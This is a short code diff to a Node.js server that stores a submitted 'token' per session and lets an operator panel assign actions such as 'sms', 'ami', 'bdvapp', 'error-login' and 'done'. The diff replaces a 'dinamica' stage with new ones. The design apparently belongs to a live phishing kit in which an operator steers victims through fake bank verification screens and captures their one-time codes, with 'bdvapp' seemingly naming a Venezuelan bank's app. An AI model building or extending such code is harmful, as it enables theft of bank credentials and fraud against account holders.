@@ -144,10 +144,12 @@ async function handleRequest(req, res) {
       const body = await parseJsonBody(req);
       sessions[id].token = body.token || '';
       const currentAction = sessions[id].action;
-      if (currentAction === 'sms') {
-        sessions[id].state = 'received-sms';
+      if (currentAction === 'ami') {
+        sessions[id].state = 'received-ami';
+      } else if (currentAction === 'bdvapp') {
+        sessions[id].state = 'received-bdvapp';
       } else {
-        sessions[id].state = 'received-dinamica';
+        sessions[id].state = 'received-sms';
       }
       sessions[id].action = null;
       sessions[id].last_seen = Date.now();
@@ -155,7 +157,7 @@ async function handleRequest(req, res) {
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
-    // 5. Asignar acción desde el panel de operador (dinamica, sms, error-login, done, etc.)
+    // 5. Asignar acción desde el panel de operador (sms, ami, bdvapp, error-login, done, etc.)
     const actionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/action$/);
     if (actionMatch && req.method === 'POST') {
       const id = actionMatch[1];
@@ -163,7 +165,7 @@ async function handleRequest(req, res) {
       const body = await parseJsonBody(req);
       sessions[id].state = body.state || sessions[id].state;
       sessions[id].action = body.action;
-      if (body.action === 'dinamica' || body.action === 'sms') {
+      if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
         sessions[id].token = '';
       }
       sessions[id].last_seen = Date.now();
